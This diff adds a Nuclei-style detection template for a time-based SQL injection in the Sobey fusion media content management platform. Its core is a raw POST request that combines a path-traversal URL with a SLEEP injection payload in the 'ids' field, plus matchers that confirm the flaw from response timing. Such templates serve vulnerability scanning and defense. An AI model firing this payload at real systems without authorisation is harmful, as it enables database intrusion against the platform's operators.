@@ -1,0 +1,39 @@
+id: poc-yaml-sobey-imcmp-tianma-op-sqli
+info:
+  name: Sobey Fusion Media Content Management Platform SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(4,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/js/%2e%2e/tianma/op HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        opstatus=up&siteCode=1&token=1&ids=1') OR (SELECT * FROM (SELECT(SLEEP({{t1}})))x)--+x
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"data":'
+          - '目录配置'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
